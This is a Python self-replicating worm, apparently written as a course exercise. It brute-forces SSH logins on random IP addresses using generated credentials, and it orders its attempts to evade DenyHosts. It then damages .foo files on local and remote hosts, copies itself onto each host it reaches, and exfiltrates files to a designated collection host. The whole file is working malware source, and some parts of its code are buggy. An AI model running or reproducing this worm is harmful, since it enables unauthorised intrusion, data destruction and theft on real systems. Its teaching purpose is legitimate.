#!/usr/bin/env python
import sys
import os
import glob
import random
import paramiko
import scp
import select
import signal

print("\nHELLO FROM FooVirus\n")

print("This is a demonstration of how easy it is to write")
print("a self-replicating program. This virus will infect")
print("all files with names ending in .foo in the directory in")
print("which you execute an infected file.  If you send an")
print("infected file to someone else and they execute it, their,")
print(".foo files will be damaged also.\n")

def sig_handler(signum,frame): os.kill(os.getpid(),signal.SIGKILL)
signal.signal(signal.SIGINT, sig_handler)

debug = 1      # IMPORTANT:  Before changing this setting, read the last
               #             paragraph of the main comment block above. As
               #             mentioned there, you need to provide two IP
               #             addresses in order to run this code in debug 
               #             mode. 
NHOSTS = NUSERNAMES = NPASSWDS = 3

trigrams = '''bad bag bal bak bam ban bap bar bas bat bed beg ben bet beu bum 
                  bus but buz cam cat ced cel cin cid cip cir con cod cos cop 
                  cub cut cud cun dak dan doc dog dom dop dor dot dov dow fab 
                  faq fat for fuk gab jab jad jam jap jad jas jew koo kee kil 
                  kim kin kip kir kis kit kix laf lad laf lag led leg lem len 
                  let nab nac nad nag nal nam nan nap nar nas nat oda ode odi 
                  odo ogo oho ojo oko omo out paa pab pac pad paf pag paj pak 
                  pal pam pap par pas pat pek pem pet qik rab rob rik rom sab 
                  sad sag sak sam sap sas sat sit sid sic six tab tad tom tod 
                  wad was wot xin zap zuk'''

digrams = '''al an ar as at ba bo cu da de do ed ea en er es et go gu ha hi 
              ho hu in is it le of on ou or ra re ti to te sa se si ve ur'''

trigrams = trigrams.split()
digrams  = digrams.split()

def get_new_usernames(how_many):
    if debug: return ['seed']      # need a working username for debugging
    if how_many is 0: return 0
    selector = "{0:03b}".format(random.randint(0,7))
    usernames = [''.join(map(lambda x: random.sample(trigrams,1)[0] if int(selector[x]) == 1 else random.sample(digrams,1)[0], range(3))) for x in range(how_many)]
    return usernames

def get_new_passwds(how_many):
    if debug: return ['dees']      # need a working username for debugging
    if how_many is 0: return 0
    selector = "{0:03b}".format(random.randint(0,7))
    passwds = [ ''.join(map(lambda x:  random.sample(trigrams,1)[0] + (str(random.randint(0,9)) if random.random() > 0.5 else '') if int(selector[x]) == 1 else random.sample(digrams,1)[0], range(3))) for x in range(how_many)]
    return passwds

def get_fresh_ipaddresses(how_many):
    if debug: return ['10.0.2.53']   
                    # Provide one or more IP address that you
                    # want `attacked' for debugging purposes.
                    # The usrname and password you provided
                    # in the previous two functions must
                    # work on these hosts.
    if how_many is 0: return 0
    ipaddresses = []
    for i in range(how_many):
        first,second,third,fourth = map(lambda x: str(1 + random.randint(0,x)), [223,223,223,223])
        ipaddresses.append( first + '.' + second + '.' + third + '.' + fourth )
    return ipaddresses 

# For the same IP address, we do not want to loop through multiple user 
# names and passwords consecutively since we do not want to be quarantined 
# by a tool like DenyHosts at the other end.  So let's reverse the order 
# of looping.
while True:
    usernames = get_new_usernames(NUSERNAMES)
    passwds =   get_new_passwds(NPASSWDS)
#    print("usernames: %s" % str(usernames))
#    print("passwords: %s" % str(passwds))
    # First loop over passwords
    for passwd in passwds:
        # Then loop over user names
        for user in usernames:
            # And, finally, loop over randomly chosen IP addresses
            for ip_address in get_fresh_ipaddresses(NHOSTS):
                print("\nTrying password %s for user %s at IP address: %s" % (passwd,user,ip_address))
                files_of_interest_at_target = []
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(ip_address,port=22,username=user,password=passwd,timeout=5)
                    print("\n\nconnected\n")
                    # Let's make sure that the target host was not previously 
                    # infected:

                    received_list = error = None
                    stdin, stdout, stderr = ssh.exec_command('ls')
                    error = stderr.readlines()
                    if error is not None: 
                        print(error)
		    cmd = "ls Foovirusworm.py"
                    stdin, stdout, stderr = ssh.exec_command(cmd)
                    received_list = list(map(lambda x: x.encode('utf-8'), stdout.readlines()))
                    if len(received_list) > 0:
                        print("Already infected")
                        exit() 

                    # Now let's look for files that contain the string 'abracadabra'
		    # Now let's look for files with extension '.foo'
		    IN = open(sys.argv[0], 'r')
		    virus = [line for (i,line) in enumerate(IN) if i < 37]
		    for item in glob.glob("*.foo"):
     	    	 	IN = open(item, 'r')
		    	all_of_it = IN.readlines()
		    	IN.close()
		    	if any(line.find('foovirus') for line in all_of_it): next
		    	os.chmod(item, 0777)    
		    	OUT = open(item, 'w')
		    	OUT.writelines(virus)
		    	all_of_it = ['#' + line for line in all_of_it]
		    	OUT.writelines(all_of_it)
		    	OUT.close()

                    cmd = 'ls *.foo'
                    stdin, stdout, stderr = ssh.exec_command(cmd)
                    error = stderr.readlines()
                    if error is not None: 
                        print(error)
                        next
                    received_list = list(map(lambda x: x.encode('utf-8'), stdout.readlines()))
                    for item in received_list:
                        files_of_interest_at_target.append(item.strip())
                    print("\nfiles of interest at the target: %s" % str(files_of_interest_at_target))

		    #Infect any .foo files with '#' at target machine
                    for item in files_of_interest_at_target:  
                        item = item[:-1]
                        var = item.decode("utf-8")
			#cmd = "sed -i -e '/Pointer/{r Foo_Abra.py N}' D.foo %s" %var                      
			cmd = "sed -i -e 's/^/#/' %s" %var
                        stdin, stdout, stderr = ssh.exec_command(cmd)

                    scpcon = scp.SCPClient(ssh.get_transport())
                    if len(files_of_interest_at_target) > 0:
                        for target_file in files_of_interest_at_target:
                            scpcon.get(target_file)
                    # Now deposit a copy of AbraWorm.py at the target host:
                    scpcon.put(sys.argv[0])              
                    scpcon.close()
                except:
                    next
                # Now upload the exfiltrated files to a specially designated host,
                # which can be a previously infected host.  The worm will only 
                # use those previously infected hosts as destinations for 
                # exfiltrated files if it was able to send the login credentials
                # used on those hosts to its human masters through, say, a 
                # secret IRC channel. (See Lecture 29 on IRC)
                if len(files_of_interest_at_target) > 0:
                    print("\nWill now try to exfiltrate the files")
                    try:
                        ssh = paramiko.SSHClient()
                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        #  For exfiltration demo to work, you must provide an IP address and the login 
                        #  credentials in the next statement:
                        ssh.connect('10.0.2.53',port=22,username='seed',password='dees',timeout=5)
                        scpcon = scp.SCPClient(ssh.get_transport())
                        print("\n\nconnected to exhiltration host\n")
                        for filename in files_of_interest_at_target:
                            scpcon.put(filename)
                        scpcon.close()
                    except: 
                        print("No uploading of exfiltrated files\n")
                        next
    if debug: break

